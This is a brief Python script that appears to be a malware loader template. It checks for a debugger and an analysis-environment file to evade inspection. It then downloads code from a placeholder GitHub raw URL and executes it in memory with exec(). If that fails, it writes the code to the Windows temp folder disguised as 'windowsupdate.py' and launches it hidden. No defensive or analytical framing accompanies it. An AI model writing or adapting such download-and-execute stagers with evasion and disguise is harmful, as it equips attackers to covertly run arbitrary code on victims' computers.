import os, sys, base64, requests

def check_environment():
    # Anti-analysis checks
    if hasattr(sys, 'gettrace') and sys.gettrace():
        return False
    if os.path.exists(r"C:\analysis\vmcheck.exe"):
        return False
    return True

def install_core():
    core_url = "https://raw.githubusercontent.com/[YOUR_GITHUB]/[REPO]/main/core.py"
    try:
        # Memory execution preferred
        code = requests.get(core_url).text
        exec(code)
    except:
        # Disk fallback
        temp_path = os.path.join(os.environ['TEMP'], 'windowsupdate.py')
        with open(temp_path, 'w') as f:
            f.write(code)
        os.system(f'start /min pythonw "{temp_path}"')

if check_environment():
    install_core()
